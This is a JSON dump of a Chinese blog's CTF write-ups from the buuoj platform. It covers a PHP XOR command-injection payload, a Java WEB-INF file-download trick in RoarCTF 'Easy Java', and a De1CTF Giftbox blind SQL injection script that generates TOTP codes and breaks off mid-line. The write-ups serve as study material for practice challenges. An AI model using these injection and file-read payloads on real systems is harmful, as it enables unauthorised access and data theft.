数据：<code>abs=system&amp;cos=cat /flag</code></p>\n<p><img src=\"/pic/24.png\" alt=\"\"></p>\n<p>在PHP中无法直接数字与不加引号的字符异或，需要将数字转换成字符类型</p>\n<p><img src=\"/pic/25.png\" alt=\"\"></p>\n<p><img src=\"/pic/26.png\" alt=\"\"></p>\n<p><img src=\"/pic/27.png\" alt=\"\"></p>\n<p>PHP异或操作，x位与x+n位异或结果是x位，后面n位直接丢弃。</p>"},{"title":"buuoj刷题记录9","date":"2020-01-24T15:18:32.000Z","_content":"\n## [RoarCTF 2019]Easy Java\n\n### 0x00 基础\n\nWEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。\n如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。\n/WEB-INF/web.xml : Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n\n<!--more-->\n\n/WEB-INF/classes/ : 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。\n/WEB-INF/lib/ : 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。\n页面放在WEB-INF目录下面,这样可以限制访问,提高安全性.如JSP,html\n\n在get方式拿不到文件的时候试试post\n\n### 0x01 分析&操作\n\n下载web.xml文件查看\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n\n    <welcome-file-list>\n        <welcome-file>Index</welcome-file>\n    </welcome-file-list>\n\n    <servlet>\n        <servlet-name>IndexController</servlet-name>\n        <servlet-class>com.wm.ctf.IndexController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>IndexController</servlet-name>\n        <url-pattern>/Index</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>LoginController</servlet-name>\n        <servlet-class>com.wm.ctf.LoginController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>LoginController</servlet-name>\n        <url-pattern>/Login</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>DownloadController</servlet-name>\n        <servlet-class>com.wm.ctf.DownloadController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>DownloadController</servlet-name>\n        <url-pattern>/Download</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>FlagController</servlet-name>\n        <servlet-class>com.wm.ctf.FlagController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>FlagController</servlet-name>\n        <url-pattern>/Flag</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n```\n\n其中有一个FlagController，尝试下载这个文件\n\n下载后直接打开，发现有一串base64编码，解码后就是flag\n\n![](/pic/37.png)\n\n`flag{cb0751c7-6081-482d-8b03-f0edede8e178}`","source":"_posts/buuoj刷题记录9.md","raw":"---\ntitle: buuoj刷题记录9\ndate: 2020-01-24 23:18:32\ntags:\n - roarctf\n - web\ncategories: \n - 刷题记录\n---\n\n## [RoarCTF 2019]Easy Java\n\n### 0x00 基础\n\nWEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。\n如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。\n/WEB-INF/web.xml : Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。\n\n<!--more-->\n\n/WEB-INF/classes/ : 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。\n/WEB-INF/lib/ : 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。\n页面放在WEB-INF目录下面,这样可以限制访问,提高安全性.如JSP,html\n\n在get方式拿不到文件的时候试试post\n\n### 0x01 分析&操作\n\n下载web.xml文件查看\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n\n    <welcome-file-list>\n        <welcome-file>Index</welcome-file>\n    </welcome-file-list>\n\n    <servlet>\n        <servlet-name>IndexController</servlet-name>\n        <servlet-class>com.wm.ctf.IndexController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>IndexController</servlet-name>\n        <url-pattern>/Index</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>LoginController</servlet-name>\n        <servlet-class>com.wm.ctf.LoginController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>LoginController</servlet-name>\n        <url-pattern>/Login</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>DownloadController</servlet-name>\n        <servlet-class>com.wm.ctf.DownloadController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>DownloadController</servlet-name>\n        <url-pattern>/Download</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>FlagController</servlet-name>\n        <servlet-class>com.wm.ctf.FlagController</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>FlagController</servlet-name>\n        <url-pattern>/Flag</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n```\n\n其中有一个FlagController，尝试下载这个文件\n\n下载后直接打开，发现有一串base64编码，解码后就是flag\n\n![](/pic/37.png)\n\n`flag{cb0751c7-6081-482d-8b03-f0edede8e178}`","slug":"buuoj刷题记录9","published":1,"updated":"2020-01-24T15:18:32.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssflk000spk7edpjq6pbn","content":"<h2 id=\"RoarCTF-2019-Easy-Java\"><a href=\"#RoarCTF-2019-Easy-Java\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Java\"></a>[RoarCTF 2019]Easy Java</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。<br>如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。<br>/WEB-INF/web.xml : Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>\n<a id=\"more\"></a>\n\n<p>/WEB-INF/classes/ : 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。<br>/WEB-INF/lib/ : 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。<br>页面放在WEB-INF目录下面,这样可以限制访问,提高安全性.如JSP,html</p>\n<p>在get方式拿不到文件的时候试试post</p>\n<h3 id=\"0x01-分析-amp-操作\"><a href=\"#0x01-分析-amp-操作\" class=\"headerlink\" title=\"0x01 分析&amp;操作\"></a>0x01 分析&amp;操作</h3><p>下载web.xml文件查看</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">web-app</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://xmlns.jcp.org/xml/ns/javaee\"</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">version</span>=<span class=\"string\">\"4.0\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">welcome-file-list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">welcome-file</span>&gt;</span>Index<span class=\"tag\">&lt;/<span class=\"name\">welcome-file</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">welcome-file-list</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Index<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Login<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Download<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Flag<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>其中有一个FlagController，尝试下载这个文件</p>\n<p>下载后直接打开，发现有一串base64编码，解码后就是flag</p>\n<p><img src=\"/pic/37.png\" alt=\"\"></p>\n<p><code>flag{cb0751c7-6081-482d-8b03-f0edede8e178}</code></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"RoarCTF-2019-Easy-Java\"><a href=\"#RoarCTF-2019-Easy-Java\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Java\"></a>[RoarCTF 2019]Easy Java</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。<br>如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。<br>/WEB-INF/web.xml : Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>","more":"<p>/WEB-INF/classes/ : 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。<br>/WEB-INF/lib/ : 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。<br>页面放在WEB-INF目录下面,这样可以限制访问,提高安全性.如JSP,html</p>\n<p>在get方式拿不到文件的时候试试post</p>\n<h3 id=\"0x01-分析-amp-操作\"><a href=\"#0x01-分析-amp-操作\" class=\"headerlink\" title=\"0x01 分析&amp;操作\"></a>0x01 分析&amp;操作</h3><p>下载web.xml文件查看</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">web-app</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://xmlns.jcp.org/xml/ns/javaee\"</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"</span></span></span><br><span class=\"line\"><span class=\"tag\">         <span class=\"attr\">version</span>=<span class=\"string\">\"4.0\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">welcome-file-list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">welcome-file</span>&gt;</span>Index<span class=\"tag\">&lt;/<span class=\"name\">welcome-file</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">welcome-file-list</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>IndexController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Index<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>LoginController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Login<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>DownloadController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Download<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Flag<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>其中有一个FlagController，尝试下载这个文件</p>\n<p>下载后直接打开，发现有一串base64编码，解码后就是flag</p>\n<p><img src=\"/pic/37.png\" alt=\"\"></p>\n<p><code>flag{cb0751c7-6081-482d-8b03-f0edede8e178}</code></p>"},{"title":"Hello World","date":"2019-12-19T12:49:28.000Z","_content":"\n第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2019-12-19 20:49:28\n---\n\n第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移\n","slug":"hello-world","published":1,"updated":"2019-12-19T12:49:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfln000vpk7e40xp93mq","content":"<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>\n","site":{"data":{}},"excerpt":"","more":"<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>\n"},{"title":"python 网络编程","date":"2020-03-14T07:11:38.000Z","updated":"2020-03-14T07:11:38.000Z","_content":"","source":"_posts/python-网络编程.md","raw":"---\ntitle: python 网络编程\ndate: 2020-03-14 15:11:38\nupdated: 2020-03-14 15:11:38\ntags:\ncategories:\n---\n","slug":"python-网络编程","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssflr000ypk7eftghdf5p","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"buuoj刷题记录8","date":"2020-01-12T04:57:41.000Z","_content":"\n## [De1CTF 2019]Giftbox\n\n### 0x00 基础\n\ntotp:TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。TOTP是基于散列的消息认证码（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。\n\nSQL盲注\n\nopen_basedir绕过\n\n<!--more-->\n\n\n\n### 0x01 分析\n\n打开网页发现是类似一个linux终端的界面，cd，ls，cat，clear，help，exix，输入help提示可运行下列命令，ls查看后，发现有一个usage.md\n\n```bash\nlogin [username] [password]\nlogout\nlaunch\ntargeting [code] [position]\ndestruct \n```\n\nfuzz后发现要登入，登入抓包的时候发现有一个totp参数\n\n```http\nGET /shell.php?a=login%20admin%20admin&totp=59858608 HTTP/1.1\nHost: 9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: close\nReferer: http://9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn/\nCookie: PHPSESSID=urs1ifeeiqsj6dam5rvs0l50nt\n```\n\n进行login时发现username处存在单引号sql盲注，执行usage中其他操作需要登入\n\n```bash\n[de1ta@de1ta-mbp /sandbox]% login admin' admin\nlogin fail, user not found.\n[de1ta@de1ta-mbp /sandbox]% login admin'# admin\nlogin fail, password incorrect.\n[de1ta@de1ta-mbp /sandbox]% targeting\nlogin first.\n[de1ta@de1ta-mbp /sandbox]% launch\nlogin first.\n```\n\n查看源码，再main.js发现了数据提交过程，和服务器totp设置\n\n```js\n···\n/*\n[Developer Notes]\nOTP Library for Python located in js/pyotp.zip\nServer Params:\ndigits = 8\ninterval = 5\nwindow = 1\n*/\n···\n···\n$.ajax({\n        url: host + '/shell.php?a='+encodeURIComponent(input)+'&totp=' + new TOTP(\"GAXG24JTMZXGKZBU\",8).genOTP(),\n        type: \"GET\",\n        dataType: 'json',\n        success: (res) => {\n            e_main.html($('#main').html() + '[<span id=\"usr\">' + usrName + '</span>@<span class=\"host\">de1ta-mbp</span> ' + position + ']% ' + input + '<br/>' + res.message + '<br/>')\n            if (e_console.height()-$(window).height()>0){e_console.css('top',-(e_console.height()-$(window).height()));}else{e_console.css('top',5);}\n        },\n        error: (res) => {\n            e_main.html($('#main').html() + '[<span id=\"usr\">' + usrName + '</span>@<span class=\"host\">de1ta-mbp</span> ' + position + ']% ' + input + '<br/>System Fatal Error!<br/>')\n            if (e_console.height()-$(window).height()>0){e_console.css('top',-(e_console.height()-$(window).height()));}else{e_console.css('top',5);}\n        }\n      })\n···\n```\n\n### 0x02 操作\n\n编写盲注脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 1/14/2020 9:42 PM\nimport pyotp\nimport requests\nimport time\n\ndef get(url, payload):\n    time.sleep(0.5)\n    totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)\n    params = {\n        'a': \"login admin'/**/and/**/(\"+payload+\")# admin\",\n        'totp': totp.now()\n    }\n    # print(params)\n    html = requests.get(url,params=params,).text\n    # print(html)\n    return html\n\n\n\n\ndef binsea(s_payload,len=64):\n    result = ''\n    for x in range(1, len+1):\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n            url = 'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'\n            html = get(url, payload)\n            # print(html, '*-*-*-*-*-*', mid)\n            if 